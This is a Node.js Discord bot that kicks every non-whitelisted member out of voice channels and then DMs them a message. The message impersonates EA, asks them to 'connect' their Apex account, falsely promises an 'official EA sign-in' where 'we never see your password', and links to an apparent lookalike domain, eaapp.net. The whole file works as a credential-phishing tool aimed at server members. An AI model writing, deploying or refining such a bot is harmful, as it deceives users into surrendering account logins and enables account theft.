require("dotenv").config();

const {
    Client,
    GatewayIntentBits
} = require("discord.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildVoiceStates
    ]
});

// These two users are allowed to join ANY voice channel
const WHITELIST = new Set([
    "1538749878988185671",
    "1491269141817065593"
]);

const DM_MESSAGE = `
🎮 One step to squad up

Hey! Voice and squad channels in EA Community open up once you connect your Apex profile to Discord.

It links the EA account you already play Apex with — official EA sign-in, we never see your password, ~20 seconds, no forms.

After that our smart teammate-finder can match you, and squadmates can drop straight into your lobby instead of adding you as a friend every game.

Connect through EA's official account system:
https://eaapp.net/

Thanks!
`;

client.once("ready", () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on("voiceStateUpdate", async (oldState, newState) => {
    // Ignore people who aren't actually joining a VC
    if (!newState.channelId) return;

    // Allow you and your friend
    if (WHITELIST.has(newState.id)) return;

    const member = newState.member;
    if (!member) return;

    try {
        // Disconnect them from the VC
        await member.voice.disconnect(
            "Not whitelisted for voice channels"
        );

        console.log(`Disconnected ${member.user.tag}`);

        // DM them
        try {
            await member.send(DM_MESSAGE);
            console.log(`DM sent to ${member.user.tag}`);
        } catch (err) {
            console.log(`Couldn't DM ${member.user.tag}`);
        }

    } catch (err) {
        console.error(
            `Couldn't disconnect ${member.user.tag}:`,
            err.message
        );
    }
});

client.login(process.env.DISCORD_TOKEN);